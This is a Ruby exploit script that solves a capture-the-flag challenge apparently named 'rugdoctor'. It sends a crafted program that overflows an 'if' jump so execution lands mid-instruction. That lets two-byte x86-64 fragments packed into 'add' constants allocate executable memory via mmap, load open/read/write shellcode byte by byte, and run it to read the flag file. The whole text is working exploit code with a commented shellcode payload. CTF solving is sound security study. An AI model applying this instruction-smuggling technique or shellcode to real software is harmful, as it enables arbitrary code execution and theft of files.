# encoding: ASCII-8bit

require 'socket'
require 'timeout'
require_relative './libronsolve'

# Data files
FILE_CHALLENGE = File.join(__dir__, '..', 'challenge', 'src', 'rugdoctor')
FLAG_FILE = '/home/ctf/flag.txt'

# open / read / write shellcode
SHELLCODE = "\xeb\x41\x5f\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00" +
            "\x00\x00\x0f\x05\x48\x89\xc7\x48\x81\xec\x00\x01" +
            "\x00\x00\x48\x8d\x34\x24\xba\x00\x01\x00\x00\xb8" +
            "\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\x48" +
            "\x89\xc2\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff" +
            "\xb8\x3c\x00\x00\x00\x0f\x05\xe8\xba\xff\xff\xff" +
            FLAG_FILE + "\0"

if SHELLCODE.length > 255
  raise 'Shellcode is too long!'
end

host, port = get_host_port()
s = TCPSocket.new(host, port)

# Wait for the server to be ready
a = ''
loop do
  a += s.gets
  if a.include?('GO')
    break
  end
end

# We're going to make this `if` jump too far, which will cause the execution to
# jump into the middle of a future instructino

# We need approximately this many "add" lines to overflow correctly (there's
# some buffer space)
NEEDED_ADDS = 9_370

# Padding - this gets skipped
adds = [1] * 7

# This is the code that gets run "in between" adds
# This sets up a syscall to mmap to allocate r/w/x memory
# Note that we can only (reasonably) use two bytes at a time!
adds.concat([
  # Padding
  "\xcc\xcc", # This is jusssst skipped but required

  # Set rdi to 0 (to allocate memory anywhere)
  "\x6a\x00", # push 0
  "\x5f\x90", # pop rdi / nop

  # Set rsi to 1 (length - min size is a page, so it'll get rounded way up)
  "\x6a\x01", # push 1
  "\x5e\x90", # pop rsi

  # Set rdx to 7 (prot = read | write | exec)
  "\x6a\x07", # push 7
  "\x5a\x90", # pop rdx

  # Set r10 to 0x22 (flags = MAP_PRIVATE | MAP_ANONYMOUS)
  "\x6a\x22", # push 0x22
  "\x41\x5a", # pop r10

  # Set r8 to -1 (fd)
  "\x6a\xff", # push -1
  "\x41\x58", # pop r8

  # Set r9 to 0 (offset)
  "\x6a\x00", # push 0
  "\x41\x59", # pop r9

  # Set rax to 9 (the sys_mmap number)
  "\x6a\x09", # push 9
  "\x58\x90", # pop rax

  # syscall
  "\x0f\x05",

  # This map adds a `jmp $+3` after each instruction, which jumps to the next
].map { |c| "#{ c }\xeb\x03".unpack('V').pop })

# After that block runs, rax will point to an executable buffer in memory

# This code preserves that buffer by storing it in rbx
adds << "\x50\x5b\xeb\x03".unpack('V').pop # push rax / pop rbx

# Load the shellcode into memory one byte at a time
# This is essentially:
#
# mov byte ptr [rax], c
# inc al
SHELLCODE.chars.each do |c|
  # This instruction is 3 characters! That means we don't cleanly control the
  # jmp and are stuck jmp'ing the distance of the next instruction (which,
  # thankfully, hits code we control!)
  # mov byte ptr [rax], c / jmp $+49
  adds << "\xc6\x00#{ c }\xeb".unpack('V').pop

  # This code is jumped over
  adds.concat([1] * 10)

  # The jmp $+49 hits the second byte of this, so we do a NOP and then our
  # standard jump $+3
  adds << "\x00\x90\xeb\x03".unpack('V').pop # <-- this runs, starting at the second byte

  # This increments al - incrementing rax is too long, and incrementing eax
  # breaks the pointer
  #
  # We know that mmap() will always return page-aligned memory, so it's safe to
  # do this up to 255 times
  adds << "\xfe\xc0\xeb\x03".unpack('V').pop
end

# Finally, call rbx to give execution to our code
adds << "\xff\xd3\xeb\x03".unpack('V').pop

# This adds enough junk to the end to cause the overflow
adds.concat([1] * (NEEDED_ADDS - adds.length))

# Build the code
code = <<~CODE
  let $b 0

  # This 'if' jumps too far, and ends up in the middle of an instruction
  if $b
  #{ adds.map { |add| "    add $c #{ add }\n" }.join }
  endif

  exit 0
CODE

# puts "Press enter"
# $stdin.gets

# Send the code
s.puts(code)

# Indicate that we're done writing
s.shutdown(Socket::SHUT_WR)

data = ''
loop do
  a = s.gets
  if a.nil?
    print(data)
    check_flag(data)
    puts
    exit
  end

  data += a
end
